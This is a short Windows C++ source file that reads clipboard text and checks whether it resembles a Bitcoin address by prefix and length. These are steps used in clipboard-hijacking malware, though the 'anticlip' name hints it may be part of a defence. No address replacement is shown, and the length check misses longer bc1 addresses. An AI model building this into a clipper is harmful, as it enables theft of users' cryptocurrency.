#include "anticlip.h"


std::string clippedText() {
	if (!OpenClipboard(NULL)) { //Attempt to open our clipboard
		return "ERROR";
	}

	HANDLE hClip = GetClipboardData(CF_TEXT); //Attempt to get the data from clipboard
	if (hClip == NULL) {
		return "ERROR";
	}
	LPVOID gLock = GlobalLock(hClip);
	if (gLock == 0) {
		return "ERROR";
	}
	std::string cliptext = (char*)gLock;
	GlobalUnlock(hClip);
	CloseClipboard();
	return cliptext;
}


bool btcAddy(std::string wallet) {
	std::string btcTypes[3] = { "bc1", "1","3" }; //make sure out wallet is valid
	if (size(wallet) >= 26 and size(wallet) <= 35 and wallet != "ERROR") {
		if (btcTypes[0] == wallet.substr(0, 3)) {
			return true;
		}
		else if (btcTypes[1] == wallet.substr(0, 1)) {
			return true;
		}
		else if (btcTypes[2] == wallet.substr(0, 1)) {
			return true;
		}
		else {
			return false;
		}
	}
	return false;
}